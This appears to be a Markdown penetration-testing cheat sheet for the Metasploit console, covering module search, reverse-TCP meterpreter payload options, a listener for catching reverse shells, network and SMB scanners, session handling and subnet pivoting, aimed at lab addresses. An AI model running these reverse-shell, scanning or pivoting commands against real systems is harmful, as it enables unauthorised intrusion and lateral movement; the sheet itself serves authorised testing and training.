---
type: tool
category: exploitation, framework
tags: [metasploit, msf, exploitation, post-exploitation, msfvenom]
source: teamghsoftware/security-cheatsheets
---

## What it is
Metasploit Framework (msf) is the industry-standard exploitation framework. Provides exploit modules, payloads, auxiliary scanners, and post-exploitation capabilities.

## Console basics

```bash
# Launch
msfconsole

# Search for a module
msf > search <keyword>
msf > search type:exploit platform:linux <keyword>

# Select a module
msf > use exploit/multi/handler
msf > use exploit/<path>

# Show options for current module
msf > show options

# Set an option
msf > set RHOSTS 10.10.10.10
msf > set LHOST 10.10.16.x
msf > set LPORT 4444
msf > set PAYLOAD linux/x64/meterpreter/reverse_tcp

# Run
msf > run
msf > exploit

# Background a session
meterpreter > background

# List sessions
msf > sessions -l

# Interact with session
msf > sessions -i <id>
```

## Generic listener (catch any reverse shell)

```bash
msf > use exploit/multi/handler
msf > set PAYLOAD linux/x64/shell/reverse_tcp   # or meterpreter variant
msf > set LHOST 0.0.0.0
msf > set LPORT 4444
msf > run -j    # run as background job
```

## Useful auxiliary modules

```bash
# TCP port scanner
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
run

# SMB version scan
use auxiliary/scanner/smb/smb_version

# HTTP directory scan
use auxiliary/scanner/http/dir_scanner

# DNS enumeration
use auxiliary/gather/dns_enum
set DOMAIN target.htb
run
```

## Session management

```bash
msf > exploit -z          # run exploit, immediately background session
msf > exploit -j          # run exploit as background job
msf > jobs -l             # list running jobs
msf > jobs -k <id>        # kill a job
msf > sessions -l         # list all sessions
msf > sessions -i <id>    # interact with session
```

## Routing / pivoting

```bash
# Route all traffic to a subnet through a meterpreter session
msf > route add <subnet> <netmask> <session-id>
# e.g. route add 192.168.1.0 255.255.255.0 1
```

## Related
- [[msfvenom]]
- [[meterpreter]]
- [[Pentest Privesc Cheatsheet]]
